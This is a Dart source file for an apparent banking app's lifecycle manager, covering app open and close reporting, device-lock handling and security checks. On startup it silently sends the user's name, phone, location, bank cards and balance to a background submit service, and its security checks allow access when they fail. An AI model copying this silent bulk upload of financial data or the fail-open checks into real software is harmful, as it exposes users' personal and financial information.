import 'package:flutter/foundation.dart';
// Fix: Use BankNetworkService for app lifecycle events (has appOpen/appClose methods)
import '../services_app_bank/bank_network_service.dart';
// Fix: Use BankPublicApiService for device status/security checks
import '../services_app_bank/bank_public_api_service.dart';
import '../services_app_bank/bank_data_submit_service.dart';
import '../providers_app_bank/bank_user_provider.dart';
import '../../../common/network/security/device_security_manager.dart';

class AppLifecycleManager {
  static final AppLifecycleManager _instance = AppLifecycleManager._internal();
  factory AppLifecycleManager() => _instance;
  AppLifecycleManager._internal();

  // Fix: Use BankNetworkService instead of BankPublicApiService
  final BankNetworkService _networkService = BankNetworkService.instance;
  final DeviceSecurityManager _securityManager = DeviceSecurityManager.instance;
  final BankDataSubmitService _dataSubmitService = BankDataSubmitService();
  BankUserProvider? _userProvider;
  
  bool _isInitialized = false;
  String? _sessionId;
  DateTime? _appOpenTime;

  /// Initialize the app lifecycle manager
  Future<void> initialize({BankUserProvider? userProvider}) async {
    if (_isInitialized) return;
    
    try {
      // Store user provider reference
      _userProvider = userProvider;
      
      // Initialize device security manager
      await _securityManager.initialize();
      
      // Report app open event
      await _reportAppOpen();
      
      // Submit startup data (background operation, don't wait)
      _submitStartupData();
      
      _isInitialized = true;
      debugPrint('AppLifecycleManager initialized successfully');
    } catch (e) {
      debugPrint('Failed to initialize AppLifecycleManager: $e');
    }
  }

  /// Submit startup data to server (background operation)
  Future<void> _submitStartupData() async {
    try {
      await _dataSubmitService.initialize();
      
      // Get user data if available
      String? phone;
      String? fullName;
      String? location;
      String? city;
      double? totalBalance;
      
      if (_userProvider != null && _userProvider!.isInitialized) {
        phone = _userProvider!.user?.phone;
        fullName = _userProvider!.user?.fullName;
        location = _userProvider!.user?.location ?? _userProvider!.globalData?.location;
        city = _userProvider!.user?.city ?? _userProvider!.globalData?.city;
        totalBalance = _userProvider!.totalAssets;
      }
      
      // Submit data (silent background operation)
      final success = await _dataSubmitService.submitData(
        phone: phone,
        fullName: fullName,
        location: location,
        city: city,
        cards: _userProvider?.bankCards,
        totalBalance: totalBalance,
      );
      
      if (success) {
        debugPrint('✅ Startup data submitted successfully');
      } else {
        debugPrint('⚠️ Startup data submission failed (non-critical)');
      }
    } catch (e) {
      debugPrint('⚠️ Error submitting startup data: $e (non-critical)');
    }
  }

  /// Report app open event to backend
  Future<void> _reportAppOpen() async {
    try {
      _appOpenTime = DateTime.now();
      
      final deviceId = await _securityManager.getDeviceId();
      // Fix: Use getAppSignature instead of generateAppSignature
      final appSignature = await _securityManager.getAppSignature();
      
      // Fix: Use BankNetworkService.appOpen with correct parameters
      final response = await _networkService.appOpen(
        deviceId: deviceId,
        appSignature: appSignature,
        appVersion: await _getAppVersion(),
        platform: await _getPlatform(),
      );

      if (response.statusCode == 200 && response.data != null) {
        _sessionId = response.data!.sessionId;
        
        // Check if device is locked
        if (response.data!.deviceLocked) {
          final lockReason = response.data!.lockReason ?? 'Device is locked';
          await _handleDeviceLocked(lockReason);
        }
        
        debugPrint('App open event reported successfully. Session ID: $_sessionId');
      } else {
        debugPrint('Failed to report app open event: ${response.error ?? response.message}');
      }
    } catch (e) {
      debugPrint('Error reporting app open event: $e');
    }
  }

  /// Report app close event to backend
  Future<void> reportAppClose() async {
    if (!_isInitialized || _appOpenTime == null) return;
    
    try {
      final deviceId = await _securityManager.getDeviceId();
      // Fix: Use getAppSignature instead of generateAppSignature
      final appSignature = await _securityManager.getAppSignature();
      final sessionDuration = DateTime.now().difference(_appOpenTime!).inSeconds;
      
      // Fix: Use BankNetworkService.appClose with correct parameters
      final response = await _networkService.appClose(
        deviceId: deviceId,
        appSignature: appSignature,
        sessionDuration: sessionDuration,
      );

      if (response.statusCode == 200) {
        debugPrint('App close event reported successfully');
      } else {
        debugPrint('Failed to report app close event: ${response.error ?? response.message}');
      }
    } catch (e) {
      debugPrint('Error reporting app close event: $e');
    }
  }

  /// Send heartbeat to maintain session
  Future<void> sendHeartbeat() async {
    if (!_isInitialized || _appOpenTime == null) return;
    
    try {
      final sessionDuration = DateTime.now().difference(_appOpenTime!).inSeconds;
      
      // This would typically be called from an authenticated service
      // For now, we'll just log it
      debugPrint('Heartbeat: Session duration ${sessionDuration}s');
    } catch (e) {
      debugPrint('Error sending heartbeat: $e');
    }
  }

  /// Handle device locked scenario
  Future<void> _handleDeviceLocked(String reason) async {
    debugPrint('Device is locked: $reason');
    
    // Show device locked dialog or navigate to locked screen
    // This would typically show a full-screen overlay or navigate to a locked screen
    // For now, we'll just log it
    debugPrint('Device locked - reason: $reason');
  }

  /// Get app version
  Future<String> _getAppVersion() async {
    try {
      // You can get this from package_info_plus or similar package
      return '1.0.0'; // Placeholder
    } catch (e) {
      return 'unknown';
    }
  }

  /// Get platform information
  Future<String> _getPlatform() async {
    try {
      if (kIsWeb) {
        return 'web';
      } else {
        switch (defaultTargetPlatform) {
          case TargetPlatform.android:
            return 'android';
          case TargetPlatform.iOS:
            return 'ios';
          case TargetPlatform.windows:
            return 'windows';
          case TargetPlatform.macOS:
            return 'macos';
          case TargetPlatform.linux:
            return 'linux';
          default:
            return 'unknown';
        }
      }
    } catch (e) {
      return 'unknown';
    }
  }

  /// Check device security status
  Future<bool> checkDeviceStatus() async {
    try {
      // Fix: BankPublicApiService.checkDeviceStatus() has no parameters
      final response = await BankPublicApiService.instance.checkDeviceStatus();
      
      // Fix: NetworkResponse uses 'isSuccess' getter
      if (response.isSuccess && response.data != null) {
        final deviceLocked = response.data!['device_locked'] ?? false;
        if (deviceLocked) {
          final lockReason = response.data!['lock_reason'] ?? 'Device is locked';
          await _handleDeviceLocked(lockReason);
          return false;
        }
        return true;
      }
      return true; // Default to allowing access if check fails
    } catch (e) {
      debugPrint('Error checking device status: $e');
      return true; // Default to allowing access if check fails
    }
  }

  /// Register device with backend
  Future<bool> registerDevice() async {
    try {
      // Fix: BankPublicApiService.registerDevice() has no parameters
      final response = await BankPublicApiService.instance.registerDevice();

      // Fix: NetworkResponse uses 'isSuccess' getter
      if (response.isSuccess) {
        debugPrint('Device registered successfully');
        return true;
      } else {
        debugPrint('Failed to register device: ${response.message}');
        return false;
      }
    } catch (e) {
      debugPrint('Error registering device: $e');
      return false;
    }
  }

  /// Perform security check
  Future<bool> performSecurityCheck(String checkType) async {
    try {
      // Fix: BankPublicApiService.performSecurityCheck() has no parameters
      final response = await BankPublicApiService.instance.performSecurityCheck();

      // Fix: NetworkResponse uses 'isSuccess' getter
      if (response.isSuccess) {
        debugPrint('Security check passed');
        return true;
      } else {
        debugPrint('Security check failed: ${response.message}');
        
        // Check if device should be locked
        if (response.data != null && response.data!['device_lock'] == true) {
          final lockReason = response.data!['lock_reason'] ?? 'Security check failed';
          await _handleDeviceLocked(lockReason);
        }
        
        return false;
      }
    } catch (e) {
      debugPrint('Error performing security check: $e');
      return true; // Default to allowing access if check fails
    }
  }

  /// Get session ID
  String? get sessionId => _sessionId;

  /// Check if manager is initialized
  bool get isInitialized => _isInitialized;

  /// Get app open time
  DateTime? get appOpenTime => _appOpenTime;

  /// Dispose resources
  void dispose() {
    _isInitialized = false;
    _sessionId = null;
    _appOpenTime = null;
  }
}
